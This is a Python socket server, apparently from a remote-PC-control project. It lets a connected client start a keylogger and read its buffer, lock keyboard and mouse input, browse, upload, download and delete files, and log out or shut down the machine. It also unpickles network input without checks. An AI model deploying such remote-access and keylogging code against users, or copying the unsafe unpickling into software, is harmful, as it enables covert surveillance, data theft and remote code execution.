import socket
import struct
from getmac import get_mac_address 
from keylogger import KeyLogger
from disable_input import lock_input, unlock_input
from file_management import *
from shutdown_logout import *
import threading

BUF_SIZE = 256
class SocketServer:
    def __init__(self, host, port):
        """
        Creates a new instance of SocketServer

        Parameters
        ----------

        host : str
            host address of the listening server
        port : int
            port on which the server is listening
        """
        self.__host = host
        self.__port = port
        self.__running = False
        self.__used_slot = False
        self.__keylogger = None
        self.__block = threading.Lock()
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__init_socket() 
    
    def __init_socket(self):
        """
        Binds the server socket to the given host and port
        """
        self.__server_socket.bind((self.__host, self.__port))

    def __server_listening(self):
        """
        Listens for new connections.
        """
        self.__server_socket.listen()
        while self.__running:
            self.__block.acquire()
            connection, address = self.__server_socket.accept()
            if self.__used_slot:
                print("Connection refused! No free slots!")
                connection.close()
                self.__block.release()
                continue
            else:
                self.__used_slot = True
            self.__block.release()
            thread = threading.Thread(target=self.__client_connection, args=(connection,))
            thread.start()

    def __receive_msg(self, connection):
        """
        Utility function to receive request from client
        """
        # size of message
        payload_size = struct.calcsize('>L')
        packed_msg_size = connection.recv(payload_size)
        if packed_msg_size == b'' or not self.__running:
            return None
        msg_size = struct.unpack(">L", packed_msg_size)[0]
        size = msg_size
        
        # message content
        data = b""
        while size > 0:
            data += connection.recv(min(size, BUF_SIZE))
            size = msg_size - len(data)
        return pickle.loads(data)

    def __client_connection(self, connection):
        """
        Main method for handle client request.
        """
        while self.__used_slot and self.__running:
            try:
                request = self.__receive_msg(connection)
            
                if (request is None):
                    self.__used_slot = False
                    break
                
                print(request)
                data = b""
                if request[0] == "request_mac":
                    data = self.__request_mac_handler()
                elif request[0] == "logout":
                    self.__logout_handler()
                elif request[0] == "shutdown":
                    self.__shutdown_handler()
                elif request[0] == "request_key":
                    data = self.__request_key_handler()
                elif request[0] == "stop_key":
                    self.__stop_key_handler()
                elif request[0] == "control_input":
                    self.__control_input_handler(request[1])
                elif request[0] == "file_management":
                    data = self.__file_management_handler(request[1])
                # encode data and send through socket
                data = pickle.dumps(data)
                size = len(data)
                connection.sendall(struct.pack('>L', size) + data)
            except ConnectionResetError:
                self.__used_slot = False
            except ConnectionAbortedError:
                self.__used_slot = False
            except BrokenPipeError:
                self.__used_slot = False
                
    def __file_management_handler(self, data):
        opcode = data["opcode"]
        if opcode == file_opcode.LISTDIR:
            root_path = data["path"]
            return {"pwd": get_parent_dir(root_path), "content": get_list_dir(root_path)}
        elif opcode == file_opcode.PASTEFILE:
            save_file(data["file_content"], data["path"])
        elif opcode == file_opcode.COPYFILE:
            return get_file(data["path"])
        elif opcode == file_opcode.DELFILE:
            delete_file(data["path"])
        return b""
                
    def __control_input_handler(self, data):
        """
        handler for control input request
        """
        if data["is_lock"]:
            lock_input()
        else:
            unlock_input()
    
    def __logout_handler(self):
        logout()
    
    def __shutdown_handler(self):
        shutdown()
        
    def __request_key_handler(self):
        if not self.__keylogger:
            self.__keylogger = KeyLogger()
            self.__keylogger.start()
        return self.__keylogger.take_buff()
        
    def __stop_key_handler(self):
        if self.__keylogger:
            self.__keylogger.stop()
            self.__keylogger = None

    def __request_mac_handler(self):
        return str(get_mac_address())
    
    def start_server(self):
        """
        Starts the server if it is not running already.
        """
        if self.__running:
            print("Server is already running")
        else:
            self.__running = True
            server_thread = threading.Thread(target=self.__server_listening, daemon=True)
            server_thread.start()
    
    def stop_server(self):
        """
        Stops the server and closes all connections
        """
        if self.__running:
            self.__running = False
            closing_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            closing_connection.connect((self.__host, self.__port))
            closing_connection.close()
            self.__block.acquire()
            self.__server_socket.close()
            self.__block.release()
        else:
            print("Server not running!")
            
server = SocketServer('127.0.0.1', 26100)
server.start_server()
time.sleep(50)
server.stop_server()